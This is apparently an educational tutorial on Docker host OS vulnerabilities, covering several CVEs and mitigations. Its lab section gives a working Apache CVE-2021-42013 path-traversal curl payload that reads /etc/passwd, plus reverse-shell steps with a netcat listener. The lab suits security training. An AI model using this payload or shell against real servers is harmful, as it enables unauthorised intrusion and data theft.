## **Host OS Vulnerabilities in Docker Containers**
The first item of the **OWASP Docker Top 10** highlights **Host OS vulnerabilities**—a critical issue where a security weakness in the host operating system can be exploited to break out of containers and gain control over the host machine.

---
### **Understanding Host OS Vulnerabilities**
Docker containers share the **host OS kernel**. If the host OS has a vulnerability, attackers can exploit it to:
- **Escape the container** (break out and gain access to the host).
- **Escalate privileges** (gain root access on the host).
- **Compromise other containers** running on the same host.
Since containers do not provide full isolation like traditional VMs, a vulnerable **host OS kernel** means all running containers are at risk.
---
## **Examples of Host OS Vulnerabilities**
### **1️⃣ Dirty COW (CVE-2016-5195)**
- **Vulnerability Type:** Privilege escalation in the Linux kernel.
- **Exploit:** Allows overwriting read-only files and gaining root access.
- **Impact on Containers:** Attackers can modify system files and escape from a container to the host.
- **Fix:** Kernel patching (`yum update` or `apt upgrade`).
### **2️⃣ OverlayFS Privilege Escalation (CVE-2021-3493)**
- **Vulnerability Type:** OverlayFS filesystem flaw in Ubuntu.
- **Exploit:** Attackers can escalate privileges from an unprivileged container.
- **Fix:** Update the Ubuntu kernel.
### **3️⃣ runC Container Escape (CVE-2019-5736)**
- **Vulnerability Type:** Allows container breakout.
- **Exploit:** A malicious container can overwrite the `runc` binary to gain host access.
- **Fix:** Update `runc` and avoid running containers as `root`.
### **4️⃣ CVE-2021-42013 (Apache Path Traversal)**
- **Vulnerability Type:** Remote Code Execution in Apache HTTP Server 2.4.50.
- **Exploit:** Allows attackers to bypass access restrictions and execute arbitrary code.
- **Impact on Containers:** If a containerized web server runs Apache with this vulnerability, an attacker can execute system commands, escalate privileges, and potentially gain access to the host.
- **Fix:** Upgrade Apache to **2.4.51+**.

## **Exploiting a Host OS Vulnerability**
### **🛠 Lab: Exploiting CVE-2021-42013 in a Docker Container**
#### **1️⃣ Setting Up the Vulnerable Apache Container**
`git clone https://github.com/devenes/cve-2021-42013-docker-lab cd cve-2021-42013-docker-lab docker build -t apache-cgi . docker run -dit --name apache-lab -p 8080:80 apache-cgi`
This launches an Apache server with **CVE-2021-42013** vulnerability.
#### **2️⃣ Exploiting the Vulnerability**
Use `curl` to access the `/etc/passwd` file:
`curl -s --path-as-is "http://localhost:8080/cgi-bin/%%32%65%%32%65/etc/passwd"`
This bypasses Apache’s path restrictions, exposing **sensitive system data**.
#### **3️⃣ Gaining a Reverse Shell**
Run the attack script:
`chmod +x script.sh ./script.sh http://localhost:8080 192.168.1.100 4444`

Listen for the connection:
`nc -lvnp 4444`
Now, you have a **remote shell access** to the vulnerable container.

## **🛡️ Mitigation Strategies**
### **1️⃣ Keep Host OS and Kernel Updated**
- **Ubuntu/Debian:**   
    `apt update && apt upgrade -y`
    
- **CentOS/RHEL:**
    `yum update -y`
### **2️⃣ Use Minimalist Host OS**
- **Alpine Linux** or **Distroless images** reduce the attack surface.
- Avoid unnecessary **software packages** on the host.
### **3️⃣ Implement Strong Access Controls**
- Use **non-root users** in containers:
    `USER 1001`
- Disable **privileged mode**:
    `docker run --cap-drop=ALL --security-opt no-new-privileges`
### **4️⃣ Use Security Tools**
- **Trivy** (Scan for OS vulnerabilities)
    `trivy image my-docker-image`
    
- **Lynis** (Audit host security)    
    `lynis audit system`
    
- **Grype** (Scan for CVEs in containers)   
    `grype my-docker-image`

### **5️⃣ Use Kernel Security Features**
- **AppArmor / SELinux** (Limit container privileges)
- **Seccomp profiles** (Restrict system calls)
- **Cgroups** (Limit resource usage)

## **📝 Summary**

| **Threat**                  | **Impact**                             | **Mitigation**                         |
| --------------------------- | -------------------------------------- | -------------------------------------- |
| Dirty COW (CVE-2016-5195)   | Privilege escalation, container escape | Kernel updates                         |
| OverlayFS Exploit           | Container privilege escalation         | Use latest kernel, disable OverlayFS   |
| runC Escape (CVE-2019-5736) | Host takeover via malicious containers | Update `runc`, avoid `root` containers |
| CVE-2021-42013              | Remote Code Execution (Apache)         | Patch Apache                           |
By following these **mitigation strategies**, you can **harden your Docker environments** and **prevent host OS attacks**.
